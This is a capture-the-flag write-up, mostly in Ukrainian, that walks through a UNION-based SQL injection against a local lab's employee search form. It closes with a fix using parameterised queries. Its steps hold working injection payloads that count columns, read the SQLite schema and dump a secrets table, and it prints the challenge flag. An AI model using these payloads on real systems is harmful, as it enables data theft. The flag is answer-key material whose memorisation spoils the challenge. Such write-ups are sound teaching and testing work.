# Writeup: Flag 7 - Leaked Directory (SQL Injection)

1. Відкрити `http://localhost:8087` і дослідити форму пошуку співробітників (`GET /search?q=`).
2. Перевірити параметр `q` на ін'єкцію: вставити `'` — сторінка повертає помилку SQL, отже запит будується конкатенацією рядків.
3. Визначити кількість стовпців: `' ORDER BY 3--` працює, `' ORDER BY 4--` дає помилку → у запиті 3 стовпці.
4. Дізнатися структуру БД (SQLite) через службову таблицю:
   `' UNION SELECT 1,name,sql FROM sqlite_master--`
   У відповіді видно таблицю `vault` зі стовпцями `title`, `secret`.
5. Витягти вміст таблиці:
   `' UNION SELECT id,title,secret FROM vault--`
6. Отримати прапор: `CTF{un10n_s3l3ct_dr41ns_th3_v4ult_7731}`.

## Виправлення (для звіту)
Використовувати параметризовані запити: `DB.execute("... WHERE name LIKE ?", ('%' + q + '%',))`.
Також не виводити тексти помилок БД користувачу та не зберігати секрети в тій самій БД, що й публічні дані.
